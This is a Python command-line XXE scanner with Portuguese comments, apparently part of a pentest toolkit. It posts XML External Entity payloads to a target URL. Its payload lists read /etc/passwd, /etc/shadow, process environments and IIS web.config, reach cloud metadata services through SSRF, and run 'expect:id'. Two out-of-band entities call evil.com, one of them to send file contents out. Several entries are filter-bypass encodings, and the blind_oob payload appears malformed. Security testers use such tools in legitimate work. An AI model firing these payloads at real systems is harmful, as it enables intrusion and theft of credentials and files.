#!/usr/bin/env python3
"""Modulo de deteccao de XXE (XML External Entity).

Testa se o servidor e vulneravel a XXE via uploads de XML:
  - SVG — inline XML com entidades externas
  - SOAP — web services com XML
  - DOCX/XLSX — formatos baseados em XML/ZIP
  - RSS/Atom — feeds XML
  - Generic — POST body com Content-Type application/xml

Fluxo:
  1. Envia payloads de deteccao em XML (POST body, Content-Type: application/xml)
  2. Verifica se a resposta contem conteudo do arquivo (file read) ou indicador de SSRF
  3. Se detectado, envia payloads de exploit (file read, SSRF, blind)
  4. Classifica: detectado, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparse
import asyncio
import logging
from collections.abc import Awaitable
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.xxedetect")

_CATEGORY_MAP: dict[str, list[str]] = {
    "detect": ["basic_xxe", "param_entity", "svg_xxe", "soap_xxe", "rss_xxe"],
    "file_read": ["passwd_read", "hosts_read", "winini_read", "environ_read", "shadow_read"],
    "ssrf": ["ssrf_localhost", "ssrf_private", "ssrf_metadata", "expect_header"],
    "blind": ["blind_dtd", "blind_length", "blind_oob"],
    "bypass": ["utf16_bypass", "utf7_bypass", "param_entity_bypass", "dtd_external", "cdata_bypass", "comment_bypass"],
}

_DETECT_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "basic_xxe",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "generic",
        ["root:", "/bin/bash"],
    ),
    (
        "param_entity",
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>',
        "generic",
        ["root:", "/bin/bash"],
    ),
    (
        "svg_xxe",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
        "svg",
        ["root:", "/bin/bash"],
    ),
    (
        "soap_xxe",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>',
        "soap",
        ["root:", "/bin/bash"],
    ),
    (
        "rss_xxe",
        '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<rss version="2.0"><channel><title>&xxe;</title></channel></rss>',
        "rss",
        ["root:", "/bin/bash"],
    ),
]

_FILE_READ_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "passwd_read",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "generic",
        ["root:", "/bin/bash"],
    ),
    (
        "hosts_read",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
        "generic",
        ["localhost", "127.0.0.1"],
    ),
    (
        "winini_read",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
        "generic",
        ["[fonts]", "[extensions]"],
    ),
    (
        "environ_read",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
        "generic",
        ["PATH=", "HOME="],
    ),
    (
        "shadow_read",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
        "generic",
        ["root:", "$6$", "!"],
    ),
    (
        "cmdline_read",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><root>&xxe;</root>',
        "generic",
        ["python", "java"],
    ),
    (
        "iis_webconfig",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><root>&xxe;</root>',
        "generic",
        ["<configuration>", "connectionString"],
    ),
    (
        "proc_self_status",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/status">]><root>&xxe;</root>',
        "generic",
        ["Name:", "Pid:"],
    ),
]

_SSRF_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "ssrf_localhost",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><root>&xxe;</root>',
        "generic",
        ["response"],
    ),
    (
        "ssrf_private",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.0.0.1">]><root>&xxe;</root>',
        "generic",
        ["response"],
    ),
    (
        "ssrf_metadata_aws",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "generic",
        ["ami-id", "instance-id"],
    ),
    (
        "ssrf_metadata_gcp",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>',
        "generic",
        ["metadata"],
    ),
    (
        "expect_header",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect:id">]><root>&xxe;</root>',
        "generic",
        ["uid=", "gid="],
    ),
    (
        "ssrf_port_scan",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><root>&xxe;</root>',
        "generic",
        ["response"],
    ),
]

_BLIND_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "blind_dtd",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>test</root>',
        "generic",
        ["response"],
    ),
    (
        "blind_length",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "generic",
        ["response"],
    ),
    (
        "blind_oob",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY & #x25; exfil SYSTEM http://evil.com/?data=%file;">">%eval;%exfil;]><root>test</root>',
        "generic",
        ["response"],
    ),
    (
        "blind_error",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_file_12345">]><root>&xxe;</root>',
        "generic",
        ["error", "exception", "warning"],
    ),
    (
        "blind_parameter",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % param1 SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; content \'%param1;\'>">%eval;]><root>&content;</root>',
        "generic",
        ["response"],
    ),
]

_BYPASS_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "utf16_bypass",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "utf-16le",
        ["root:", "/bin/bash"],
    ),
    (
        "utf7_bypass",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "utf-7",
        ["root:", "/bin/bash"],
    ),
    (
        "param_entity_bypass",
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root>test</root>',
        "generic",
        ["root:", "/bin/bash"],
    ),
    (
        "dtd_external",
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>test</root>',
        "generic",
        ["response"],
    ),
    (
        "cdata_bypass",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><![CDATA[&xxe;]]></root>',
        "generic",
        ["root:", "/bin/bash"],
    ),
    (
        "comment_bypass",
        '<!DOCTYPE foo [<!-- comment --><!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "generic",
        ["root:", "/bin/bash"],
    ),
    (
        "encoding_bypass",
        '<?xml version="1.0" encoding="iso-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "generic",
        ["root:", "/bin/bash"],
    ),
    (
        "double_encoding",
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://%2f%2fetc%2fpasswd">]><root>&xxe;</root>',
        "generic",
        ["root:", "/bin/bash"],
    ),
]

_XML_PARAMS: list[str] = [
    "xml", "xml_data", "xml_file", "data", "body", "content",
    "document", "payload", "input", "request", "message",
    "soap_body", "svg", "feed", "rss", "atom",
]


@dataclass(frozen=True, slots=True)
class XXEAttempt:
    """Tentativa individual de XXE."""

    technique: str
    category: str
    format: str
    payload: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str


@dataclass(frozen=True, slots=True)
class XXEResult:
    """Resultado consolidado do scan de XXE."""

    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[XXEAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia requisicao baseline para obter resposta de referencia."""
    try:
        resp = await client.get(url, follow_redirects=False)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


def _check_xxe_response(
    body: bytes,
    status: int,
    indicators: list[str],
) -> bool:
    """Verifica se a resposta indica XXE bem-sucedido."""
    text = body.decode("utf-8", errors="ignore").lower()
    if status == 0:
        return False
    return any(indicator.lower() in text for indicator in indicators)


def _build_xxe_body(payload: str, encoding: str = "generic") -> tuple[bytes, str]:
    """Constrói o body XML com encoding especificado."""
    if encoding == "utf-16le":
        return payload.encode("utf-16-le"), "application/xml; charset=utf-16le"
    if encoding == "utf-7":
        return payload.encode("ascii"), "application/xml; charset=utf-7"
    return payload.encode("utf-8"), "application/xml"


async def _test_detect(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XXEAttempt]:
    """Testa XXE basico com payloads de deteccao."""
    attempts: list[XXEAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, fmt, indicators in _DETECT_PAYLOADS:
        body, ct = _build_xxe_body(payload)
        try:
            resp = await client.post(
                base_url,
                content=body,
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_xxe_response(resp.content, t_status, indicators)

            attempts.append(XXEAttempt(
                technique=technique,
                category="detect",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(XXEAttempt(
                technique=technique,
                category="detect",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_file_read(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XXEAttempt]:
    """Testa XXE via leitura de arquivos."""
    attempts: list[XXEAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, fmt, indicators in _FILE_READ_PAYLOADS:
        body, ct = _build_xxe_body(payload)
        try:
            resp = await client.post(
                base_url,
                content=body,
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_xxe_response(resp.content, t_status, indicators)

            attempts.append(XXEAttempt(
                technique=technique,
                category="file_read",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(XXEAttempt(
                technique=technique,
                category="file_read",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_ssrf(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XXEAttempt]:
    """Testa XXE via SSRF (server-side request forgery)."""
    attempts: list[XXEAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, fmt, indicators in _SSRF_PAYLOADS:
        body, ct = _build_xxe_body(payload)
        try:
            resp = await client.post(
                base_url,
                content=body,
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_xxe_response(resp.content, t_status, indicators)

            attempts.append(XXEAttempt(
                technique=technique,
                category="ssrf",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(XXEAttempt(
                technique=technique,
                category="ssrf",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_blind(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XXEAttempt]:
    """Testa XXE cego (resposta indireta)."""
    attempts: list[XXEAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, fmt, indicators in _BLIND_PAYLOADS:
        body, ct = _build_xxe_body(payload)
        try:
            resp = await client.post(
                base_url,
                content=body,
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_xxe_response(resp.content, t_status, indicators)

            attempts.append(XXEAttempt(
                technique=technique,
                category="blind",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(XXEAttempt(
                technique=technique,
                category="blind",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


async def _test_bypass(
    client: httpx.AsyncClient,
    base_url: str,
    baseline: tuple[int, int, bytes],
) -> list[XXEAttempt]:
    """Testa bypass de filtragem XXE."""
    attempts: list[XXEAttempt] = []
    b_status, b_size, _ = baseline

    for technique, payload, fmt, indicators in _BYPASS_PAYLOADS:
        body, ct = _build_xxe_body(payload, fmt)
        try:
            resp = await client.post(
                base_url,
                content=body,
                headers={"Content-Type": ct},
                follow_redirects=False,
            )
            t_status = resp.status_code
            t_size = len(resp.content)
            status_changed = t_status != b_status
            vulnerable = _check_xxe_response(resp.content, t_status, indicators)

            attempts.append(XXEAttempt(
                technique=technique,
                category="bypass",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=t_status,
                size_baseline=b_size,
                size_test=t_size,
                status_changed=status_changed,
                size_changed=abs(t_size - b_size) > 50,
                vulnerable=vulnerable,
                details=f"Status {b_status}->{t_status}" if status_changed else "Sem mudanca",
                error="",
            ))
        except httpx.RequestError as exc:
            attempts.append(XXEAttempt(
                technique=technique,
                category="bypass",
                format=fmt,
                payload=payload[:100],
                status_baseline=b_status,
                status_test=0,
                size_baseline=b_size,
                size_test=0,
                status_changed=False,
                size_changed=False,
                vulnerable=False,
                details="",
                error=str(exc),
            ))

    return attempts


def print_results(result: XXEResult) -> None:
    """Exibe os resultados do scan de XXE."""
    print(color("\n" + "=" * 60, Cyber.GRAY))
    print(color("  XXE DETECTION — RESULTADOS", Cyber.CYAN, Cyber.BOLD))
    print(color("=" * 60, Cyber.GRAY))

    print(color(f"  Target:     {result.target}", Cyber.WHITE))
    print(color(f"  Baseline:   {result.baseline_status} ({result.baseline_size} bytes)", Cyber.GRAY))
    print(color(f"  Total:      {len(result.attempts)} testes realizados", Cyber.GRAY))

    vuln_techs = result.vulnerable_techniques
    if vuln_techs:
        print(color(f"\n  [!] {len(vuln_techs)} TECNICAS VULNERAVEIS", Cyber.RED, Cyber.BOLD))
        for tech in vuln_techs[:10]:
            print(color(f"      [!] {tech}", Cyber.RED))
        print(color("\n  Severidade: ALTA", Cyber.RED, Cyber.BOLD))
    else:
        print(color("\n  [+] Nenhum XXE detectado", Cyber.GREEN, Cyber.BOLD))
        print(color("  Severidade: NENHUMA", Cyber.GREEN, Cyber.BOLD))

    issues = result.issues
    if issues:
        print(color(f"\n  Problemas ({len(issues)}):", Cyber.YELLOW, Cyber.BOLD))
        for issue in issues[:10]:
            print(color(f"      {issue}", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error]
    if errors:
        print(color(f"\n  Erros ({len(errors)}):", Cyber.GRAY))
        for e in errors[:3]:
            print(color(f"      {e.error[:80]}", Cyber.GRAY))

    print(color("=" * 60, Cyber.GRAY))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: int,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
) -> int:
    """Executa o scan XXE."""
    tls = target.startswith("https")
    client = create_async_client(timeout=timeout)

    print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
    baseline = await _test_baseline(client, target)
    if baseline[0] == 0:
        print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
        return 1

    print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))

    run_categories = categories or list(_CATEGORY_MAP.keys())
    all_attempts: list[XXEAttempt] = []

    tasks: list[Awaitable[list[XXEAttempt]]] = []
    for cat in run_categories:
        if cat == "detect":
            tasks.append(_test_detect(client, target, baseline))
        elif cat == "file_read":
            tasks.append(_test_file_read(client, target, baseline))
        elif cat == "ssrf":
            tasks.append(_test_ssrf(client, target, baseline))
        elif cat == "blind":
            tasks.append(_test_blind(client, target, baseline))
        elif cat == "bypass":
            tasks.append(_test_bypass(client, target, baseline))

    if tasks:
        results_list = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results_list:
            if isinstance(r, list):
                all_attempts.extend(r)

    vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
    blocked = [a.technique for a in all_attempts if not a.vulnerable and not a.error]
    issues: list[str] = []
    for att in all_attempts:
        if att.vulnerable:
            issues.append(f"VULN: {att.technique} - {att.details}")

    overall = "vulnerable" if vuln_techs else "secure"

    result = XXEResult(
        target=target,
        baseline_status=baseline[0],
        baseline_size=baseline[1],
        tls=tls,
        attempts=all_attempts,
        vulnerable_techniques=vuln_techs,
        blocked_techniques=blocked,
        issues=issues,
        overall_status=overall,
    )

    print_results(result)

    if output_file:
        write_output(output_file, asdict(result))

    logger.info("XXE scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln_techs))
    return 1 if vuln_techs else 0


banner_art = create_banner(
    r"""
     ___________  ___   _  _____
    | ___ \ ___ \/ _ \ | |/ / __|
    | |_/ / |_/ / |_| ||   <| _|
    |____/|____/ \___/ |_|_\\___|
    """,
    "XXE — detecta XML External Entity em web apps",
)


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-xxedetect",
        description="XXE — detecta XML External Entity em web apps",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument(
        "-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument("--concurrency", type=int, default=5, help="Requisicoes simultaneas (default: 5)")
    add_common_args(parser)
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan XXE a partir de argumentos parseados."""
    logger.info("XXE scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="xxe> ",
        description="XXE interativo.",
        example="https://target.com -c detect",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c file_read\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
